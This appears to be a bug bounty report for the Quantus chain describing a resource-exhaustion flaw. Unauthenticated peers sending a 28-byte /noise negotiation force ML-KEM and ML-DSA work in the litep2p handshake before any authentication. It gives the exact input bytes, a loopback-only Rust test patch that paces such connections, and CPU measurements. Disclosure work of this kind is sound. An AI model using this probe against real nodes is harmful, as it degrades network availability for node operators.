# 90360 bc medium unauthenticated 28 byte noise negotiation forces ml kem and ml dsa work before peer authentication

**Submitted on Aug 24th 2026 at 17:06:04 UTC by @crypt0n1337 for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #90360
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

## Severity and impact

Medium - M9: increasing network processing node resource consumption by at least 30% without brute force actions.

An unauthenticated client can select the `/noise` protocol and close before sending pqXX message 1. The Quantus listener performs expensive post-quantum cryptography before it reads that message or authenticates the peer.

On the exact frozen full-node binary, a local E2E test at only 5 connections per second increased victim CPU by 187.87% over an equal-rate TCP control. After subtracting TCP connection cost, the Quantus-specific excess was 316.02% of the preceding quiet CPU baseline. This is above the 30% Medium threshold.

The attacker sent about 140 bytes per second, performed no post-quantum cryptography, and maintained approximately 0.5 concurrent sockets. This is deterministic protocol use, not key guessing, identity enumeration, Sybil activity, or high-volume brute force.

## Affected target

* Frozen commit: `3b243b870a5442a6e5f443056f67bbba87d472f5`
* Reported node version: `0.8.0-exodus-3b243b870a5`
* Exact locally built node SHA-256: `509C2FF68AC6D637B7305258AF0B1F470BB591BC49CDF6863E8A9BC2EB4BCBC0`
* Affected component: `client/litep2p`

No public node, mainnet node, or public testnet node was tested. All traffic stayed on `127.0.0.1`.

## Root cause

After multistream selects `/noise`, the TCP listener enters `handshake()`:

{% stepper %}
{% step %}

## Construct `NoiseContext`

`client/litep2p/src/crypto/noise/mod.rs:772` constructs `NoiseContext`.
{% endstep %}

{% step %}

## Generate an ML-KEM-768 keypair

`NoiseContext::new` generates a fresh ML-KEM-768 keypair.
{% endstep %}

{% step %}

## Derive and sign with the ML-DSA-87 identity key

It calls the ML-DSA-87 identity key `sign()` method, which derives the keypair and signs the KEM public key.
{% endstep %}

{% step %}

## Derive the ML-DSA-87 keypair again

It then calls `public()`, which derives the ML-DSA-87 keypair again.
{% endstep %}

{% step %}

## Wait for pqXX message 1

Only afterward, at `noise/mod.rs:811`, does the listener wait for pqXX message 1.
{% endstep %}
{% endstepper %}

Therefore, the remote peer can force one ML-KEM-768 key generation, two ML-DSA-87 key derivations, and one ML-DSA signature without providing a peer identity or any pqXX payload.

The exact unauthenticated input is 28 application bytes:

```
0x13 || "/multistream/1.0.0\n" || 0x07 || "/noise\n"
```

The client does not need to read the response. It can close the socket after 100 ms.

## Why this is not the public litep2p pending-connection issue

[Upstream litep2p issue #282](https://github.com/paritytech/litep2p/issues/282) describes accumulation of pending sockets, file-descriptor exhaustion, and listener fairness. This report does not claim those effects.

The final E2E closes every socket after 100 ms, holds approximately 0.5 sockets on average, and shows stable file descriptors and threads. The measured impact remains after subtracting an equal-rate and equal-lifetime TCP control. The additional cost also matches the direct Quantus PQ context differential of approximately 1.47 ms per connection.

The distinct root is the Quantus modification introduced with [Quantus PR #574](https://github.com/Quantus-Network/chain/pull/574), which replaced classical handshake cryptography with ML-KEM and ML-DSA but performs that work before pqXX message 1. The public PR security review discusses identity binding and key handling, but it does not disclose this remote CPU amplification. I found no public issue, PR, or audit finding that discloses the exact root reported here.

## Security impact

Any unauthenticated remote host that can reach the P2P port can impose repeated post-quantum key-generation and signing work at negligible bandwidth and without performing equivalent cryptography. The measured relative CPU increase exceeds the program's 30% Medium M9 threshold even after generic TCP cost is removed.

The local PoC uses a short matched quiet window rather than a literal preceding 24-hour production trace because the competition prohibits testing project nodes. This comparator limitation is disclosed. It does not alter the deterministic source-level cost or the repeated exact-frozen E2E differential.

## Recommended remediation

Move expensive post-quantum context creation behind a cheap pre-authentication admission step. Possible controls include:

* a per-IP and global rate limit for pre-authentication handshakes;
* a bounded pending-handshake CPU budget;
* a stateless reachability cookie before ML-KEM key generation and ML-DSA signing;
* metrics for pending handshakes and pre-authentication CPU rejection.

Do not reuse long-lived KEM session material without a separate cryptographic design review.

## Proof of Concept

## E2E proof of concept

Save the inline patch at the end of this section as `poc-submit.patch`.

* SHA-256: `63BF6E9F13FE5E3B8E0AEE39BCC3CF4F8D583438008F07DE6587F0DC41405BC2`
* Scope of patch: one test-only change in `client/litep2p/src/lib.rs`
* `git apply --check --whitespace=error-all`: PASS
* Clean-worktree release build: PASS

{% stepper %}
{% step %}

## Apply and build the PoC

```powershell
git checkout 3b243b870a5442a6e5f443056f67bbba87d472f5
git apply .\poc-submit.patch
cargo test --release -p litep2p audit_external_raw_pre_auth_sender --no-run
```

The clean E2E rebuild completed successfully and produced:

```
Executable unittests src\lib.rs
Finished release profile [optimized]
```

{% endstep %}

{% step %}

## Start an exact frozen local node

Build and run the frozen node without benchmark features:

```powershell
cargo build --locked --release -p quantus-node
target\release\quantus-node.exe --dev --no-telemetry --no-prometheus --port 30444 --rpc-port 9944 --miner-listen-port 9833
```

The reproduced node remained at block 0 with no peers. Its P2P port was exposed only on loopback.
{% endstep %}

{% step %}

## Run the matched TCP negative control

```powershell
$env:POC_EXTERNAL_TARGET='127.0.0.1:30444'
$env:POC_EXTERNAL_MODE='tcp'
$env:POC_HOLD_MS='100'
$env:POC_WINDOW_SECONDS='60'
$env:POC_TARGET_RATE='5'

cargo test --release -p litep2p audit_external_raw_pre_auth_sender -- --nocapture
```

Fresh E2E output:

```
EXTERNAL_RAW_PREAUTH mode=tcp hold_ms=100 target_rate=5
wall_ms=60122 attempts=301 connections=301 achieved_rate_x100=500
app_bytes_sent=0
test result: ok. 1 passed; 0 failed

victim CPU: 0.25 s / 60.413911 s = 0.41381% of one core
victim RSS: 257840 KiB
victim threads: 71
victim FDs: 34
```

{% endstep %}

{% step %}

## Run the /noise positive control

```powershell
$env:POC_EXTERNAL_MODE='noise'
cargo test --release -p litep2p audit_external_raw_pre_auth_sender -- --nocapture
```

Fresh E2E output:

```
EXTERNAL_RAW_PREAUTH mode=noise hold_ms=100 target_rate=5
wall_ms=60118 attempts=301 connections=301 achieved_rate_x100=500
app_bytes_sent=8428
test result: ok. 1 passed; 0 failed

victim CPU: 0.72 s / 60.440797 s = 1.19125% of one core
victim RSS: 258096 KiB
victim threads: 71
victim FDs: 34
```

{% endstep %}

{% step %}

## Compare the results

The same node, rate, duration, socket lifetime, and number of successful connections were used in both cases.

```
quiet baseline:                  0.24601% of one core
matched TCP control:             0.41381% of one core
/noise E2E:                      1.19125% of one core
/noise increase over TCP:        187.87%
(noise - TCP) / quiet baseline:  316.02%
Quantus-specific excess:         1.561 ms per connection
```

The PoC sends 8,428 bytes in approximately 60 seconds, or about 140 bytes per second. At 5 connections per second with a 100 ms socket lifetime, it holds about 0.5 sockets on average. Threads and file descriptors remain stable.
{% endstep %}
{% endstepper %}

## Reproducibility

Two earlier exact-frozen runs with the same 5 connections per second and 100 ms lifetime produced consistent results:

| Run | TCP control | /noise CPU | Increase over TCP | Adjusted excess vs quiet |
| --- | ----------: | ---------: | ----------------: | -----------------------: |
| 1   |    0.44819% |   1.14560% |           155.61% |                  261.84% |
| 2   |    0.44819% |   1.17861% |           163.00% |                  274.23% |

The fresh clean-worktree E2E above produced an even stronger 187.87% increase over TCP and 316.02% adjusted excess over quiet.

## Inline PoC patch

The following is the complete `poc-submit.patch` (SHA-256 `63BF6E9F13FE5E3B8E0AEE39BCC3CF4F8D583438008F07DE6587F0DC41405BC2`).

```diff
diff --git a/client/litep2p/src/lib.rs b/client/litep2p/src/lib.rs
index 17b2944..8a61c9f 100644
--- a/client/litep2p/src/lib.rs
+++ b/client/litep2p/src/lib.rs
@@ -512,7 +512,90 @@ mod tests {
 	};
 	use hickory_resolver::config::{ResolverConfig, ResolverOpts};
 	use multiaddr::{Multiaddr, Protocol};
-	use std::net::Ipv4Addr;
+	use std::{
+		net::{Ipv4Addr, SocketAddr},
+		time::{Duration, Instant},
+	};
+	use tokio::net::TcpStream;
+
+	const PIPELINED_NOISE_NEGOTIATION: &[u8; 28] =
+		b"\x13/multistream/1.0.0\n\x07/noise\n";
+
+	async fn open_external_probe(
+		socket: SocketAddr,
+		mode: &str,
+	) -> Result<TcpStream, String> {
+		let mut stream = TcpStream::connect(socket).await.map_err(|error| error.to_string())?;
+		if mode == "noise" {
+			tokio::io::AsyncWriteExt::write_all(&mut stream, PIPELINED_NOISE_NEGOTIATION)
+				.await
+				.map_err(|error| error.to_string())?;
+			tokio::io::AsyncWriteExt::flush(&mut stream)
+				.await
+				.map_err(|error| error.to_string())?;
+		}
+		Ok(stream)
+	}
+
+	/// Local-only external-node probe. TCP and `/noise` modes use identical absolute pacing and
+	/// short socket lifetime; the sender performs no post-quantum operation and reads no response.
+	#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+	async fn audit_external_raw_pre_auth_sender() {
+		let Ok(socket) = std::env::var("POC_EXTERNAL_TARGET") else {
+			return;
+		};
+		let socket = socket.parse::<SocketAddr>().expect("IP:port target");
+		assert!(socket.ip().is_loopback(), "local targets only");
+		let mode = std::env::var("POC_EXTERNAL_MODE").unwrap_or_else(|_| "noise".into());
+		assert!(matches!(mode.as_str(), "tcp" | "noise"));
+		let seconds = std::env::var("POC_WINDOW_SECONDS")
+			.ok()
+			.and_then(|value| value.parse().ok())
+			.unwrap_or(60u64);
+		let target_rate = std::env::var("POC_TARGET_RATE")
+			.ok()
+			.and_then(|value| value.parse().ok())
+			.unwrap_or(5u64);
+		let hold_ms = std::env::var("POC_HOLD_MS")
+			.ok()
+			.and_then(|value| value.parse().ok())
+			.unwrap_or(100u64);
+
+		let started = Instant::now();
+		let schedule_start = tokio::time::Instant::now();
+		let interval = Duration::from_nanos(1_000_000_000 / target_rate.max(1));
+		let mut attempts = 0usize;
+		let mut connections = 0usize;
+		let mut closers = Vec::new();
+		for sequence in 0..=seconds * target_rate {
+			tokio::time::sleep_until(schedule_start + interval * sequence as u32).await;
+			attempts += 1;
+			if let Ok(stream) = open_external_probe(socket, &mode).await {
+				connections += 1;
+				closers.push(tokio::spawn(async move {
+					tokio::time::sleep(Duration::from_millis(hold_ms)).await;
+					drop(stream);
+				}));
+			}
+		}
+		for closer in closers {
+			closer.await.unwrap();
+		}
+
+		let wall_ms = started.elapsed().as_millis();
+		println!(
+			"EXTERNAL_RAW_PREAUTH target={} mode={} hold_ms={} target_rate={} wall_ms={} attempts={} connections={} achieved_rate_x100={} app_bytes_sent={}",
+			socket,
+			mode,
+			hold_ms,
+			target_rate,
+			wall_ms,
+			attempts,
+			connections,
+			connections as u128 * 100_000 / wall_ms.max(1),
+			if mode == "noise" { connections * PIPELINED_NOISE_NEGOTIATION.len() } else { 0 },
+		);
+	}
 
 	#[test]
 	fn resolver_config_falls_back_when_system_config_is_unavailable_or_empty() {
```
